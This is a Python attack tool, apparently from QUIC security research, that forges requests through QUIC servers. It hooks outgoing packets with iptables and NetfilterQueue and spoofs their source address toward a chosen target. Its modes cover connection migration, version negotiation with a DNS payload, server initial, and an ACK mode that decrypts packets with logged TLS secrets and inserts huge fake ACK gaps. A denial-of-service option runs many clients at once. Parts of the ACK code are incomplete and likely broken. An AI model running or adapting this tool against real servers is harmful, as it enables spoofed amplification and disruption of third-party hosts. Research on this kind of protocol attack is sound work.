#!/usr/bin/python3

#from concurrent.futures import process
from netfilterqueue import NetfilterQueue
from scapy.all import *
import time
import subprocess
import os
import ssl
import argparse
from argparse import RawTextHelpFormatter
from multiprocessing import Process
import traceback

import aioquic
from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h0.connection import H0_ALPN, H0Connection
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import (
    DataReceived,
    H3Event,
    HeadersReceived,
    PushPromiseReceived,
)
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import QuicEvent
from aioquic.tls import CipherSuite, SessionTicket
from aioquic.quic.logger import QuicFileLogger
from aioquic.quic.packet import QuicProtocolVersion

import minimal_http_client as cl
import vnrf_payload_dns as vp_dns


banner = '''
   ____  _    _ _____ _____ ______
  / __ \| |  | |_   _/ ____|  ____|
 | |  | | |  | | | || |    | |__ ___  _ __ __ _  ___
 | |  | | |  | | | || |    |  __/ _ \| '__/ _` |/ _ \\
 | |__| | |__| |_| || |____| | | (_) | | | (_| |  __/
  \___\_\\\\____/|_____\_____|_|  \___/|_|  \__, |\___|
                                           __/ |
                                          |___/
'''

SPOOFED_COUNT = 0
PACKET_COUNT = 0

# Iptables Templates
iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"
# Modified iptables template to handle traffic from other Docker containers
# iptables_tmpl = "iptables {action} FORWARD -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"

# Legacy Lsquic and quicly support, adjust to the correct install path
lsquic_client_tmpl = "/opt/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/client/quic/QUICforge/secrets -p {path} -K"
lsquic_client_flag_version = " -o version={version}"    # Set QUIC version
lsquic_client_flag_alpn = " -Q {alpn}"                  # Set ALPN

quicly_client_tmpl = "/home/client/quic/quicly/quicly/cli {victim_ip} {victim_port} -O -p {path} -a {alpn}"

def parse_arguments():

    gen_desc = "QUIC Request Forgery Attack Script"
    parser = argparse.ArgumentParser(description=gen_desc)
    parser._optionals.title = 'Optional Arguments'
    parser._positionals.title = 'Required Arguments'

    #General Options
    optparser = argparse.ArgumentParser(add_help=False)
    optparser.add_argument('victim_ip', help='The victim\'s IP address. The victim is the server the quic connection is established with')
    optparser.add_argument('target_ip', help='The target\'s IP address. The target is the host the forged request is send to')
    optparser.add_argument('--victim_port','-v', help='The vicitm\'s listening port. Default ist 12345', default=12345, type=int)
    optparser.add_argument('--target_port','-t', help='The target\'s listening port', default=0, type=int)
    optparser.add_argument('--path','-p', help='The path to request for http requests', default="/")
    optparser.add_argument('--alpn','-a', help='The ALPN to be used. Defaults are h3-29 for draft-29 and h3 for version 1', default='h3')
    optparser.add_argument('--dos', '-d', help='Number of client processes to be started', type=int, default=1, choices=range(1,21), metavar="[1-22]")
    #optparser.add_argument('--verbose','-v', help='Turn on stdout and stderr for client subprocesses', action='store_true')

    subparsers = parser.add_subparsers(required=True, dest='mode')
    
    #Parser for CMRF
    parser_cm = subparsers.add_parser('cm', help='Connection migration mode', parents=[optparser], description=gen_desc + '\nConnection Migration Mode', formatter_class=RawTextHelpFormatter)
    parser_cm.add_argument('--start_time','-s', help='The time to wait until triggering the connection migration', type=int, default=4)
    parser_cm.add_argument('--limit','-l', help='Limits the amount of spoofed packets (Default: 0 = No limit)', type=int, default=0)
    parser_cm.add_argument('--legacy', '-e', help='Enables legacy mode with the client specified', default=False, choices=['lsquic', 'quicly'])
    parser_cm.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
    parser_cm.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
    parser_cm._optionals.title = 'Optional Arguments'
    parser_cm._positionals.title = 'Required Arguments'

    #Parser for VNRF
    parser_vn = subparsers.add_parser('vn', help='Version negotiation mode', parents=[optparser], description=gen_desc + '\n Version Negotiation Mode', formatter_class=RawTextHelpFormatter)
    parser_vn.add_argument('--cid_len','-c', help='Length of the CID used in the initial message (currently SCID/DCID are the same length)', choices=range(0,256), metavar="[0-255]", type=int, default=20)
    parser_vn.add_argument('--payload_mode','-M', help='The payload type that is sent with VNRF', default=None, choices=['dns'])
    parser_vn.add_argument('--payload','-P', help='The payload for a VNRF attack. Only works with payload_mode', default="")
    parser_vn._optionals.title = 'Optional Arguments'
    parser_vn._positionals.title = 'Required Arguments'

    #Parser for SIRF
    parser_si = subparsers.add_parser('si', help='Server initial mode', parents=[optparser], description=gen_desc + '\nServer Initial Mode', formatter_class=RawTextHelpFormatter)
    parser_si.add_argument('--legacy', '-e', help='Enables legacy mode with the client specified', default=False, choices=['lsquic', 'quicly'])
    parser_si.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
    parser_si.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
    parser_si._optionals.title = 'Optional Arguments'
    parser_si._positionals.title = 'Required Arguments'

    #Parser for ACKRF
    parser_ack = subparsers.add_parser('ack', help='ACK mode', parents=[optparser], description=gen_desc + '\nACK Mode', formatter_class=RawTextHelpFormatter)
    parser_ack.add_argument('--version','-V', help='The quic version to be used', choices=['1', '2'], default='2')
    parser_ack._optionals.title = 'Optional Arguments'
    parser_ack._positionals.title = 'Required Arguments'

    return parser.parse_args()


def spoof_packet(packet, ip, port=0):
    
    payload = IP(packet.get_payload())
        
    # Set spoofed source address
    old_ip = payload.src
    payload.src = ip

    old_port = payload.sport
    if port != 0:
        payload.sport = port

    # Recalculate checksums for IP and UDP
    del payload[IP].chksum
    del payload[UDP].chksum
    payload = payload.__class__(bytes(payload))
    packet.set_payload(bytes(payload))
    print("[*] {old_ip}:{old_port} -> {ip}:{port}".format(old_ip=old_ip, old_port=old_port, ip=ip, port=(port if port !=0 else old_port)))

    return packet


def connection_migration_callback(packet, starttime=0, args=None):
    global SPOOFED_COUNT
    global PACKET_COUNT
    
    PACKET_COUNT += 1

    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        packet.drop()
        print("[!] Limit reached. Dropping packet")
        return

    # Ugly workaround to give enough packets to succeed with handshake
    if PACKET_COUNT > 3:
        packet = spoof_packet(packet, args.target_ip, args.target_port)
        if args.limit != 0:
            SPOOFED_COUNT += 1

    #if time.time()-starttime > args.start_time:
    #    packet = spoof_packet(packet, args.target_ip, args.target_port)
    #    if args.limit != 0:
    #        SPOOFED_COUNT += 1

    packet.accept()
    print("[*] Packet accepted")

def version_negotiation_callback(packet, args=None):
    global SPOOFED_COUNT
    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        print("Limit: ", args.limit)
        print("SPOOFED_COUNT: ", SPOOFED_COUNT)
        packet.drop()
        print("[!] Limit reached. Dropping packet")
        return

    packet = spoof_packet(packet, args.target_ip, args.target_port)
    if args.limit != 0:
        SPOOFED_COUNT += 1
    
    packet.accept()
    print("[*] Packet accepted")
    

def server_initial_callback(packet, args=None):
    global SPOOFED_COUNT
    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        print("Limit: ", args.limit)
        print("SPOOFED_COUNT: ", SPOOFED_COUNT)
        packet.drop()
        print("[!] Limit reached. Dropping packet")
        return

    packet = spoof_packet(packet, args.target_ip, args.target_port)
    if args.limit != 0:
        SPOOFED_COUNT += 1

    packet.accept()
    print("[*] Packet accepted")

def spoof_ack_packet(packet, args=None):
    """
    Decrypt a QUIC packet using TLS secrets, modify its ACK frame by changing the gap to a very large value,
    then re-encrypt and return the modified packet.
    
    Uses:
    - Session ticket at "../../app/shared/session_ticket"
    - TLS secrets at "../../app/shared/shared_secrets.log"
    """
    try:
        from aioquic.buffer import Buffer, BufferReadError
        from aioquic.quic.packet import pull_quic_header, QuicHeader, QuicPacketType
        from aioquic.quic.crypto import CryptoContext
        from aioquic.tls import CipherSuite
        import pickle
        import re
        
        # Get packet payload
        payload = IP(packet.get_payload())
        udp = payload[UDP]
        # Print src and dst IP and port
        print(f"[*] Packet from {payload.src}:{udp.sport} to {payload.dst}:{udp.dport}")
        # Extract the QUIC packet from UDP payload
        udp_payload = bytes(udp.payload)
        buf = Buffer(data=udp_payload)
        
        # Try to parse QUIC header
        header = pull_quic_header(buf, host_cid_length=20)
        
        # Only modify 1-RTT packets which are most likely to contain ACK frames
        if header.packet_type == QuicPacketType.ONE_RTT:
            print(f"[*] Found 1-RTT packet with DCID {header.destination_cid.hex()}")
            
            # Get crypto keys from the TLS secrets log
            secrets_path = "../../app/shared/shared_secrets.log"
            client_key = None
            
            # Rest of the function remains the same...
            
            if os.path.exists(secrets_path):
                # Parse the secrets log to find keys
                with open(secrets_path, "r") as f:
                    secrets = f.readlines()
                
                for line in secrets:
                    if "CLIENT_TRAFFIC_SECRET" in line:
                        # Extract client key
                        match = re.search(r'CLIENT_TRAFFIC_SECRET_0\s+\w+\s+(\w+)', line)
                        if match:
                            client_key = bytes.fromhex(match.group(1))
                             
                if client_key is None:
                    print("[!] Could not find traffic secrets for this packet")
                    return packet
                
                # Create crypto context with the secrets
                crypto_context = CryptoContext()
                crypto_context.setup()
                # crypto_context.client_traffic_secret = client_key
                # Determine if this is a client->server or server->client packet
                from_client = True
                
                # Get the encrypted payload
                encrypted_offset = buf.tell()
                encrypted_payload = buf.data[encrypted_offset:]
                
                # Decrypt the packet payload
                # TODO: Implement decryption
                # Decrypt the packet payload
                try:
                    # Get encrypted offset - the position after the header where encrypted payload begins
                    encrypted_offset = buf.tell()
                    
                    # For expected packet number, use 0 as initial value
                    expected_packet_number = 0
                    
                    # Call the correct decrypt_packet method with proper parameters
                    plain_header, decrypted_payload, packet_number, _ = crypto_context.decrypt_packet(
                        packet=udp_payload,
                        encrypted_offset=encrypted_offset,
                        expected_packet_number=expected_packet_number
                    )
                    
                    print(f"[*] Packet number: {packet_number}")
                    print("[+] Successfully decrypted packet")
                    
                    # Parse frames in the decrypted payload
                    frame_buf = Buffer(data=decrypted_payload)
                    modified_frames = bytearray()
                    
                    while frame_buf.tell() < len(decrypted_payload):
                        try:
                            frame_type = frame_buf.pull_uint_var()
                            
                            # Check if this is an ACK frame (types 0x02, 0x03)
                            if frame_type in (0x02, 0x03):
                                print(f"[+] Found ACK frame of type {hex(frame_type)}")
                                
                                # Add frame type to modified payload
                                modified_frames.extend(_encode_uint_var(frame_type))
                                
                                # Parse ACK frame
                                largest_acked = frame_buf.pull_uint_var()
                                ack_delay = frame_buf.pull_uint_var()
                                ack_range_count = frame_buf.pull_uint_var()
                                first_ack_range = frame_buf.pull_uint_var()
                                
                                # Add these values to the modified payload
                                modified_frames.extend(_encode_uint_var(largest_acked))
                                modified_frames.extend(_encode_uint_var(ack_delay))
                                
                                # Use a much higher ack_range_count to cause problems
                                new_range_count = 10  # Use 10 ACK ranges instead of original
                                modified_frames.extend(_encode_uint_var(new_range_count))
                                modified_frames.extend(_encode_uint_var(first_ack_range))
                                
                                # Add 10 fake ranges with huge gaps
                                for i in range(new_range_count):
                                    # Skip reading original ranges beyond what's in the packet
                                    if i < ack_range_count:
                                        if frame_buf.tell() < len(decrypted_payload):
                                            # Skip original gap
                                            frame_buf.pull_uint_var()
                                            # Skip original ACK range length
                                            frame_buf.pull_uint_var()
                                    
                                    # Add very large gap (cause chaos!)
                                    modified_frames.extend(_encode_uint_var(100000 + i * 100000))
                                    # Add tiny range length
                                    modified_frames.extend(_encode_uint_var(1))
                                
                                print("[+] Modified ACK frame with large gaps")
                            else:
                                # For non-ACK frames, just copy as is
                                start_pos = frame_buf.tell() - _get_uint_var_length(frame_type)
                                
                                # Determine length of this frame
                                # This is a simplified approach - in reality you'd need to parse each frame type
                                # For now, read until the start of the next frame or end of buffer
                                next_frame_start = frame_buf.tell()
                                try:
                                    while frame_buf.tell() < len(decrypted_payload):
                                        # Try to peek at the next byte - if it's the start of a new frame, stop
                                        next_byte = frame_buf.pull_uint8()
                                        frame_buf.seek(frame_buf.tell() - 1)
                                        if next_byte in (0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a):
                                            # Likely a frame boundary
                                            break
                                        frame_buf.pull_uint8()  # Consume the byte
                                except BufferReadError:
                                    pass  # End of buffer is fine
                                
                                # Add the original frame data
                                frame_length = frame_buf.tell() - start_pos
                                frame_buf.seek(start_pos)
                                original_frame = frame_buf.pull_bytes(frame_length)
                                modified_frames.extend(original_frame)
                        except BufferReadError:
                            # End of buffer reached
                            break
                    
                    # Re-encrypt the modified payload
                    
                    encrypted_modified_payload = crypto_context.encrypt_client(
                        bytes(modified_frames),
                        header.packet_number,
                        header.destination_cid
                        )
                    print("[+] Successfully re-encrypted modified packet")
                    
                    # Create new packet with the encrypted payload
                    header_bytes = udp_payload[:encrypted_offset]
                    new_udp_payload = header_bytes + encrypted_modified_payload
                    
                    # Update the packet
                    payload[UDP].payload = Raw(new_udp_payload)
                    
                    # Change source IP if requested
                    if args and hasattr(args, 'target_ip'):
                        payload.src = args.target_ip
                        if hasattr(args, 'target_port') and args.target_port != 0:
                            payload.sport = args.target_port
                    
                    # Recalculate checksums
                    del payload[IP].chksum
                    del payload[UDP].chksum
                    payload = payload.__class__(bytes(payload))
                    
                    # Update the packet
                    packet.set_payload(bytes(payload))
                    print("[+] Successfully modified ACK packet ranges")
                except Exception as e:
                    print(f"[!] Error decrypting/modifying packet: {e}")
                    import traceback
                    traceback.print_exc()
            else:
                print(f"[!] Secrets log not found at {secrets_path}")
        else:
            print(f"[*] Packet is not a 1-RTT packet (type: {header.packet_type}), not modifying")
    except Exception as e:
        print(f"[!] Error in spoof_ack_packet: {e}")
        import traceback
        traceback.print_exc()
    
    return packet

# Helper functions for QUIC variable-length integer encoding
def _encode_uint_var(value):
    """Encode a variable-length unsigned integer."""
    if value <= 63:
        return bytes([value])
    elif value <= 16383:
        return bytes([(value >> 8) | 0x40, value & 0xff])
    elif value <= 1073741823:
        return bytes([
            (value >> 24) | 0x80,
            (value >> 16) & 0xff,
            (value >> 8) & 0xff,
            value & 0xff,
        ])
    else:
        return bytes([
            (value >> 56) | 0xc0,
            (value >> 48) & 0xff,
            (value >> 40) & 0xff,
            (value >> 32) & 0xff,
            (value >> 24) & 0xff,
            (value >> 16) & 0xff,
            (value >> 8) & 0xff,
            value & 0xff,
        ])

def _get_uint_var_length(value):
    """Get the byte length of an encoded variable-length unsigned integer."""
    if value <= 63:
        return 1
    elif value <= 16383:
        return 2
    elif value <= 1073741823:
        return 4
    else:
        return 8

def ack_callback(packet, args=None):
    """
    Process QUIC packets for the ACK spoofing attack.
    Allows the 0-RTT connection to succeed, then spoofs a single ACK packet.
    
    Args:
        packet: NetfilterQueue packet
        args: Command line arguments
    """
    global PACKET_COUNT
    PACKET_COUNT += 1
    
    try:
        from aioquic.quic.packet import pull_quic_header, QuicPacketType
        from aioquic.buffer import Buffer
        
        payload = IP(packet.get_payload())
        
        # Skip non-UDP packets
        if UDP not in payload:
            packet.accept()
            return
            
        udp_payload = bytes(payload[UDP].payload)
        
        # Skip empty packets
        if not udp_payload:
            packet.accept()
            return
            
        # Try to parse the QUIC header
        try:
            buf = Buffer(data=udp_payload)
            header = pull_quic_header(buf, host_cid_length=20)
        except Exception as e:
            # Not a valid QUIC packet or parsing failed
            print(f"[!] Error parsing QUIC header: {e}")
            packet.accept()
            return
        
        # Track DCID
        dcid_hex = header.destination_cid.hex() if header.destination_cid else "None"
        print(f"[*] QUIC packet type {header.packet_type} with DCID: {dcid_hex}")
        
        # Special handling for different packet types
        if header.packet_type == QuicPacketType.ZERO_RTT:
            # Allow 0-RTT packets through - this enables the 0-RTT connection
            print(f"[+] Allowing 0-RTT packet (enabling 0-RTT connection)")
            packet.accept()
            return
        elif header.packet_type == QuicPacketType.INITIAL:
            # Allow handshake packets through normally
            print(f"[+] Allowing Initial packet (enabling handshake)")
            packet.accept()
            return
        elif header.packet_type == QuicPacketType.ONE_RTT:
            # Look for ACK frames in 1-RTT packets
            # After we've processed a few packets, spoof one ACK packet
            if PACKET_COUNT >= 2:  # Let some packets through to establish the connection
                # Only spoof one packet to avoid flooding
                print(f"[+] Spoofing ACK packet #{PACKET_COUNT}")
                spoofed_packet = spoof_ack_packet(packet, args)
                spoofed_packet.accept()
                return
            
            # Let other 1-RTT packets through normally
            print(f"[+] Allowing 1-RTT packet (enabling data transfer)")
            packet.accept()
            return
        
        # Default: accept all other packet types
        packet.accept()
        
    except Exception as e:
        print(f"[!] Error in ack_callback: {e}")
        import traceback
        traceback.print_exc()
        # If anything goes wrong, just accept the packet
        packet.accept()
    
    print(f"[*] Packet #{PACKET_COUNT} processed")

def configure_client(args):
    if args.path[0] != "/":
        args.path = "/" + args.path
    url = "https://{victim_ip}:{victim_port}{path}".format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path)
    version = 'VNRF' if args.mode == "vn" else "VERSION_2"
    cid_len = args.cid_len if "cid_len" in args else 20

    #init_dcid = b"A" * cid_len
    #init_scid = b"B" * cid_len
    init_dcid = os.urandom(cid_len)
    init_scid = os.urandom(cid_len)
    if args.mode == 'vn' and args.payload_mode != None:
        if args.payload_mode == "dns":
            init_dcid,init_scid = vp_dns.create_payload(args.payload)
    configuration = QuicConfiguration(
        is_client=True, 
        supported_versions =  [QuicProtocolVersion[version].value],
        alpn_protocols=[args.alpn],
        verify_mode = ssl.CERT_NONE,
        secrets_log_file = open("secrets/secrets.log","w"),
        connection_id_length = cid_len,
        init_dcid = init_dcid,
        init_scid = init_scid,
    )
    # # Ensure qlog directory exists
    # os.makedirs("../../app/shared/qlog/rf", exist_ok=True)
    # # Set up qlog configuration
    # configuration.quic_logger = QuicFileLogger('../../app/shared/qlog/rf')
    return url, configuration

def configure_ack_client(args):
    if args.path[0] != "/":
        args.path = "/" + args.path
    url = "https://{victim_ip}:{victim_port}{path}".format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path)
    version = 'VERSION_1' if args.version == '1' else 'VERSION_2'
    cid_len = args.cid_len if "cid_len" in args else 20

    init_dcid = os.urandom(cid_len)
    init_scid = os.urandom(cid_len)
    ticket_path = "../../app/shared/session_ticket"
    ticket = None
    if os.path.exists(ticket_path):
        with open(ticket_path, "rb") as f:
            ticket = pickle.load(f) 
    configuration = QuicConfiguration(
        is_client=True, 
        supported_versions =  [QuicProtocolVersion[version].value],
        alpn_protocols=[args.alpn],
        verify_mode = ssl.CERT_NONE,
        secrets_log_file = open("../../app/shared/shared_secrets.log", "a"),
        connection_id_length = cid_len,
        init_dcid = init_dcid,
        init_scid = init_scid,
        session_ticket = ticket,
    )
    # Ensure qlog directory exists
    os.makedirs("../../app/shared/qlog/attacker", exist_ok=True)
    # Set up qlog configuration
    configuration.quic_logger = QuicFileLogger('../../app/shared/qlog/attacker')

    return url, configuration

def configure_legacy_client(args):
    
    cmd = ""
    if args.legacy == 'lsquic':
        cmd = lsquic_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, host=args.host, path=args.path)
        if args.version and args.version != '1':
            cmd += lsquic_client_flag_version.format(version=args.version)     
        if args.alpn and args.alpn != 'h3':
            cmd += lsquic_client_flag_alpn.format(alpn=args.alpn)
    
    if args.legacy == 'quicly':
        cmd = quicly_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path, alpn=args.alpn)
    
    print(cmd)
    return cmd


def main():

    if os.geteuid() != 0:
        exit("[!] Please run this script as root")

    args = parse_arguments()
    print(banner)

    starttime = time.time()
    iptables_insert = iptables_tmpl.format(action="-I", victim_ip=args.victim_ip, victim_port=args.victim_port)
    print("[+] Inserting iptables rules.")
    print(iptables_insert)
    subprocess.run(iptables_insert.split())
    
    try:
        #Initializing netfilter queue
        q = NetfilterQueue()
        if args.mode == 'cm':
            args.limit = args.limit * args.dos
            q.bind(1, lambda packet, starttime=starttime, args=args : connection_migration_callback(packet, starttime, args))
            print("[+] Binding connection migration callback")
        elif args.mode == 'vn':
            args.limit = args.dos
            q.bind(1, lambda packet, args=args : version_negotiation_callback(packet, args))
            print("[+] Binding version negotiation callback")
        elif args.mode == 'si':
            args.limit = args.dos
            q.bind(1, lambda packet,args=args : server_initial_callback(packet, args))
            print("[+] Binding server initial callback")
        elif args.mode == 'ack':
            print("[!] ACK mode not implemented yet, test mode only")
            q.bind(1, lambda packet,args=args : ack_callback(packet, args))
            print("[+] Binding ACK callback")
        else:
            raise NotImplementedError("Mode not implemented")

        print("[+] Starting client")
        processes = []
        if args.mode in ('cm','si') and args.legacy:
            print("[!] Legacy Mode")
            cmd = configure_legacy_client(args)
            for i in range(1,args.dos+1):
                p = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                processes.append(p)
        elif args.mode == 'ack':
            url, configuration = configure_ack_client(args)
            for i in range(1,args.dos+1):
                p = Process(target=cl.start_client, args=(url, configuration, False, True,))
                processes.append(p)
                p.start()
        else:
            url, configuration = configure_client(args)
            for i in range(1,args.dos+1):
                p = Process(target=cl.start_client, args=(url, configuration,))
                processes.append(p)
                p.start()
        
        print("[+] Hooking into nfqueue")
        q.run()
        print("[+] Running nfqueue, waiting for packets")

    except KeyboardInterrupt:
        print("[-] Keyboard interrupt received. Terminating attack script.")
    except Exception as e:
        print("[!] Something went wrong!")
        print(e)
        print(traceback.format_exc())
    
    print("\n[+] Cleaning up")     
    print("[-] Terminating Client(s)")
    
    for p in processes:
        try:
            p.terminate()
        except:
            pass   
    print("[-] Unbinding netfilter queue.")
    q.unbind() 
    
    print("[-] Deleting iptables rule(s).")
    iptables_delete = iptables_tmpl.format(action="-D", victim_ip=args.victim_ip, victim_port=args.victim_port)
    print(iptables_delete)
    subprocess.run(iptables_delete.split())
    print("[+] Done")

    
if __name__ == "__main__":
    main()
